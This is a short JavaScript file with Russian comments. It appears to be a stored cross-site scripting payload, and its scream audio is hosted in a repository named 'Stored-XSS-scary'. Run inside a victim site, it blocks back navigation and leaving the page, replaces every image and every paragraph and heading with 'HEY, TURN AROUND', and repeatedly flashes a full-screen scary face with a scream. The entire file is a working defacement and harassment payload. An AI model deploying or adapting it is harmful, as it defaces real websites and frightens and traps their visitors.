// Отмена возврата (частично)

window.history.pushState(null, null, window.location.href);

window.onpopstate = function(event) {
    window.history.pushState(null, null, window.location.href);
};

window.addEventListener('beforeunload', function (e) {
    e.preventDefault();
    e.returnValue = '';
});


// Замена изображений

var images = document.getElementsByTagName("img");
var replacementPath = "https://i.pinimg.com/736x/34/87/0b/34870b74942ca44221e4c78997498d9b.jpg";

for (var i = 0; i < images.length; i++) {
    images[i].src = replacementPath;
}


// Замена текста

var paragraphsForReplace = document.getElementsByTagName("p");
var h1ForReplace = document.getElementsByTagName("h1");
var replacementText = "HEY, TURN AROUND, TURN AROUND, TURN AROUND.";

for (var i = 0; i < paragraphsForReplace.length; i++) {
    paragraphsForReplace[i].textContent = replacementText;
}

for (var i = 0; i < h1ForReplace.length; i++) {
    h1ForReplace[i].textContent = replacementText;
}


// Скример на весь экран + запуск крика

function showFullScreenImg() {
    var fullScreenImg = document.createElement("img");
    fullScreenImg.id = "fullScreenImg";
    fullScreenImg.src = "https://wallpapers.com/images/high/scary-face-pictures-fvx05bim45ctjiwh.webp";

    var audio = document.createElement("audio");
    audio.src = "https://0-dayff13r.github.io/Stored-XSS-scary/krik.mp3";

    document.body.appendChild(fullScreenImg);
    document.body.appendChild(audio);

    fullScreenImg.style.display = "block";
    audio.play();

    setTimeout(function () {
        fullScreenImg.style.display = "none";
    }, 800);
}

setTimeout(showFullScreenImg, 6000);
setTimeout(showFullScreenImg, 13000);
setTimeout(showFullScreenImg, 25000);
setTimeout(showFullScreenImg, 45000);
setTimeout(showFullScreenImg, 75000);
setTimeout(showFullScreenImg, 90000);
setTimeout(showFullScreenImg, 105000);
setTimeout(showFullScreenImg, 120000);
setTimeout(showFullScreenImg, 135000);
